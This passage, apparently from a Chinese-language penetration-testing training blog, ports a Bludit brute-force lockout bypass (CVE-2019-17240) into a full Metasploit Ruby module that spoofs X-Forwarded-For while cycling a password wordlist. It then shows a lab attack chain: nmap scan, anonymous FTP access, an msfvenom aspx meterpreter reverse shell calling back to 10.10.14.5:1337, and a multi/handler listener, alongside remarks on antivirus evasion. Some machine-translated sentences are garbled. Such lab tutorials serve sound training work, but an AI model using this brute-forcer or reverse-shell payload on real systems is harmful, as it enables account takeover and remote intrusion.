class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FileDropper</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br></pre></td></tr></table></figure>

<p>我们可以查看<code>include</code>语句以了解每个语句的作用。<a target="_blank" rel="noopener" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">这可以通过将它们与rubydoc rapid7 文档</a>交叉引用来完成。以下是文档中解释的它们各自的功能：</p>
<table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Msf::Exploit::Remote::HttpClient</code></td>
<td>该模块提供了在利用 HTTP 服务器时充当 HTTP 客户端的方法。</td>
</tr>
<tr>
<td><code>Msf::Exploit::PhpEXE</code></td>
<td>这是一种用于生成第一阶段 php 负载的方法。</td>
</tr>
<tr>
<td><code>Msf::Exploit::FileDropper</code></td>
<td>此方法在与目标建立会话后传输文件并处理文件清理。</td>
</tr>
<tr>
<td><code>Msf::Auxiliary::Report</code></td>
<td>此模块提供向 MSF DB 报告数据的方法。</td>
</tr>
</tbody></table>
<p>看看他们上面的目的，我们得出结论，我们不需要 FileDropper 方法，我们可以从最终的模块代码中删除它。</p>
<p>我们看到有不同的部分专门用于<code>info</code>模块的页面，<code>options</code>部分。我们不恰当地填写它们，向发现漏洞的个人、CVE 信息和其他相关详细信息提供信用。</p>
<h4 id="概念验证-模块信息"><a href="#概念验证-模块信息" class="headerlink" title="概念验证 - 模块信息"></a>概念验证 - 模块信息</h4><p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">    <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit Directory Traversal Image File Upload Vulnerability&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">      This module exploits a vulnerability in Bludit. A remote user could abuse the uuid</span></span><br><span class="line"><span class="string">      parameter in the image upload feature in order to save a malicious payload anywhere</span></span><br><span class="line"><span class="string">      onto the server, and then use a custom .htaccess file to bypass the file extension</span></span><br><span class="line"><span class="string">      check to finally get remote code execution.</span></span><br><span class="line"><span class="string">    &#125;</span>,</span><br><span class="line">    <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">    <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;christasa&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">        <span class="string">&#x27;sinn3r&#x27;</span>     <span class="comment"># Metasploit module</span></span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">      [</span><br><span class="line">        [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-16113&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/issues/1081&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac&#x27;</span> ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">    <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">        <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">        <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">      [</span><br><span class="line">        [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-09-07&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>一般标识信息填好后，我们就可以转到<code>options</code>菜单变量了：</p>
<h4 id="概念验证-功能"><a href="#概念验证-功能" class="headerlink" title="概念验证 - 功能"></a>概念验证 - 功能</h4><p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">register_options(</span><br><span class="line">     [</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITPASS&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The password for Bludit&#x27;</span>])</span><br><span class="line">     ])</span><br><span class="line"> <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>回顾我们的利用，我们发现需要一个单词表而不是<code>BLUDITPASS</code>模块的变量来暴力破解相同用户名的密码。它看起来像下面的片段：</p>
<p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">          <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br></pre></td></tr></table></figure>

<p>其余的漏洞利用代码需要根据移植到 Metasploit Framework 中使用的类、方法和变量进行调整，以使模块最终发挥作用。该模块的最终版本如下所示：</p>
<h4 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h4><p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;rastating&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">          <span class="string">&#x27;0ne-nine9&#x27;</span>  <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-17240&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/pull/1090&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">      <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">          <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">          <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-10-05&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br><span class="line">      </span><br><span class="line">     register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">        	<span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># -- Exploit code -- #</span></span><br><span class="line">  <span class="comment"># dirty workaround to remove this warning:</span></span><br><span class="line"><span class="comment">#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need &quot;.&quot; at the beginning.</span></span><br><span class="line"><span class="comment"># see https://github.com/nahi/httpclient/issues/252</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebAgent</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Cookie</span> &lt; <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Cookie</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">domain</span></span><br><span class="line">      <span class="variable language_">self</span>.original_domain</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_csrf</span>(<span class="params">client, login_url</span>)</span><br><span class="line">  res = client.get(login_url)</span><br><span class="line">  csrf_token = <span class="regexp">/input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;/</span>.match(res.body).captures[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_ok?</span>(<span class="params">res</span>)</span><br><span class="line">  <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Status</span>.redirect?(res.code) &amp;&amp;</span><br><span class="line">    <span class="regexp">%r&#123;/admin/dashboard&#125;</span>.match?(res.headers[<span class="string">&#x27;Location&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_auth</span>(<span class="params">client, host, username, wordlist</span>)</span><br><span class="line">  login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">  <span class="title class_">File</span>.foreach(wordlist).with_index <span class="keyword">do</span> |<span class="params">password, i</span>|</span><br><span class="line">    password = password.chomp</span><br><span class="line">    csrf_token = get_csrf(client, login_url)</span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&#x27;X-Forwarded-For&#x27;</span> =&gt; <span class="string">&quot;<span class="subst">#&#123;i&#125;</span>-<span class="subst">#&#123;password[..<span class="number">4</span>]&#125;</span>&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;tokenCSRF&#x27;</span> =&gt; csrf_token,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; username,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; password,</span><br><span class="line">    &#125;</span><br><span class="line">    puts <span class="string">&quot;[*] Trying password: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">    auth_res = client.post(login_url, data, headers)</span><br><span class="line">    <span class="keyword">if</span> auth_ok?(auth_res)</span><br><span class="line">      puts <span class="string">&quot;\n[+] Password found: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin</span></span><br><span class="line"><span class="comment">#  args = Docopt.docopt(doc)</span></span><br><span class="line"><span class="comment">#  pp args if args[&#x27;--debug&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  clnt = HTTPClient.new</span></span><br><span class="line"><span class="comment">#  bruteforce_auth(clnt, args[&#x27;--root-url&#x27;], args[&#x27;--user&#x27;], args[&#x27;--#wordlist&#x27;])</span></span><br><span class="line"><span class="comment">#rescue Docopt::Exit =&gt; e</span></span><br><span class="line"><span class="comment">#  puts e.message</span></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure>

<p>如果您想了解有关将脚本移植到 Metasploit 框架中的更多信息，请查看<a target="_blank" rel="noopener" href="https://nostarch.com/metasploit">No Starch Press 的 Metasploit：渗透测试人员指南</a>。Rapid7 还创建了关于此主题的博客文章，可<a target="_blank" rel="noopener" href="https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/">在此处</a>找到。</p>
<h1 id="MSF毒液简介"><a href="#MSF毒液简介" class="headerlink" title="MSF毒液简介"></a>MSF毒液简介</h1><hr>
<p><code>MSFVenom``MSFPayload</code>是和的后继者<code>MSFEncode</code>，这两个独立脚本过去常常与 结合使用，<code>msfconsole</code>为用户提供高度可定制且难以检测的有效负载以进行攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSFVenom`是这两种工具结合的结果。在使用此工具之前，我们必须将用于为特定处理器架构和操作系统版本生成 shellcode 的`|`结果通过管道 ()传输到，其中包含多种编码方案，用于从 shellcode 中删除不良字符。这有时会导致运行时不稳定 - 以及用于规避旧版防病毒 ( ) 和端点入侵防御/入侵检测 ( ) 软件。`MSFPayload``MSFEncode``AV``IPS/IDS</span><br></pre></td></tr></table></figure>

<p>如今，这两个组合工具为渗透测试人员提供了一种方法，可以为不同的目标主机架构和版本快速制作有效载荷，同时有可能“清理”他们的 shellcode，以便在部署时不会遇到任何错误。如今，AV 规避部分要复杂得多，因为仅基于签名的恶意文件分析已成为过去。<code>Heuristic analysis, machine learning, and deep packet inspection</code>使有效负载更难通过编码方案的几个后续迭代来逃避任何好的 AV 软件。如模块中所示<code>Payloads</code>，提交具有上述相同配置的简单有效载荷产生的命中率为<code>52/65</code>. 就全球恶意软件分析师而言，这就是宾果游戏。（全世界的恶意软件分析师是否真的说“那是宾果游戏”，这一点仍未得到证实。）</p>
<hr>
<h2 id="创建我们的有效载荷"><a href="#创建我们的有效载荷" class="headerlink" title="创建我们的有效载荷"></a>创建我们的有效载荷</h2><p>假设我们发现了一个开放的 FTP 端口，该端口要么凭据薄弱，要么意外地对匿名登录开放。现在，假设 FTP 服务器本身链接到在<code>tcp/80</code>同一台机器的端口上运行的 Web 服务，并且可以在 Web 服务的目录中查看 FTP 根目录中找到的所有文件<code>/uploads</code>。我们还假设 Web 服务没有任何检查允许我们作为客户端在其上运行的内容。</p>
<p>假设我们被允许从 Web 服务中调用任何我们想要的东西。在这种情况下，我们可以直接通过 FTP 服务器上传 PHP shell 并从 Web 访问它，触发有效载荷并允许我们从受害机器接收反向 TCP 连接。</p>
<h4 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h4><p> 扫描目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<h4 id="FTP-匿名访问"><a href="#FTP-匿名访问" class="headerlink" title="FTP 匿名访问"></a>FTP 匿名访问</h4><p> FTP 匿名访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ftp 10.10.10.5</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.5.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name (10.10.10.5:root): anonymous</span><br><span class="line"></span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password: ******</span><br><span class="line"></span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line"></span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  05:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  05:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>注意 aspnet_client，我们意识到该框将能够运行<code>.aspx</code>反向 shell。对我们来说幸运的是，<code>msfvenom</code>可以毫无问题地做到这一点。</p>
<h4 id="生成有效载荷"><a href="#生成有效载荷" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of aspx file: 2819 bytes</span><br></pre></td></tr></table></figure>

<p> 生成有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates</span><br></pre></td></tr></table></figure>

<p>现在，我们只需要导航到<code>http://10.10.10.5/reverse_shell.aspx</code>，它就会触发<code>.aspx</code>负载。然而，在我们这样做之前，我们应该在 msfconsole 上启动一个侦听器，以便在其中捕获反向连接请求。</p>
<h4 id="MSF-设置-Multi-Handler"><a href="#MSF-设置-Multi-Handler" class="headerlink" title="MSF - 设置 Multi&#x2F;Handler"></a>MSF - 设置 Multi&#x2F;Handler</h4><p> MSF - 设置 Multi&#x2F;Handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q </span><br><span class="line"></span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.5</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1337</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br></pre></td></tr></table></figure>

<hr>
<h2 id="执行负载"><a href="#执行负载" class="headerlink" title="执行负载"></a>执行负载</h2><p>现在我们可以触发<code>.aspx</code>Web 服务上的负载。这样做不会在页面上加载任何视觉上的内容，但回顾我们的<code>multi/handler</code>模块，我们会收到一个连接。我们应该确保我们的<code>.aspx</code>文件不包含 HTML，因此我们只会看到一个空白网页。然而，有效负载无论如何都是在后台执行的。</p>
<h4 id="MSF-Meterpreter-外壳"><a href="#MSF-Meterpreter-外壳" class="headerlink" title="MSF - Meterpreter 外壳"></a>MSF - Meterpreter 外壳</h4><p> MSF - Meterpreter 外壳</p>
